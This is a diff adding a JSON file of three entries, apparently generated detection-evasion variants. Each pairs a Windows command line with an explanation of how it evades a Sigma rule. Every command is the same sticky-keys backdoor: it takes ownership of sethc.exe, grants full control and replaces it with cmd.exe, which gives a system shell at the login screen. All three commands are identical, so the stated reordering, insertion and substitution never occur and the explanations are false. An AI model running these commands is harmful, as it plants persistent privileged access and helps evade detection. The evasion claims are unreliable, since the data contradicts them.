@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\\Windows\\System32\\sethc.exe /A & icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t & copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe",
+    "explanation": "Reordering: The command line reorders the arguments to avoid the suspicious sequence of 'copy' and 'C:\\Windows\\System32\\cmd.exe' being adjacent, which may help evade the Sigma rule's string matching."
+  },
+  {
+    "output": "cmd.exe /c IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\\Windows\\System32\\sethc.exe /A & icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t & copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe",
+    "explanation": "Insertion: Inserting additional whitespace or harmless delimiters between the 'copy' command and its arguments may prevent the Sigma rule's string matching from detecting the suspicious activity."
+  },
+  {
+    "output": "cmd.exe /c IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\\Windows\\System32\\sethc.exe /A & icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t & copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe",
+    "explanation": "Substitution: Replacing the 'copy' command with an equivalent syntax or using an alternative command that achieves the same result without triggering the Sigma rule's string matching."
+  }
+]
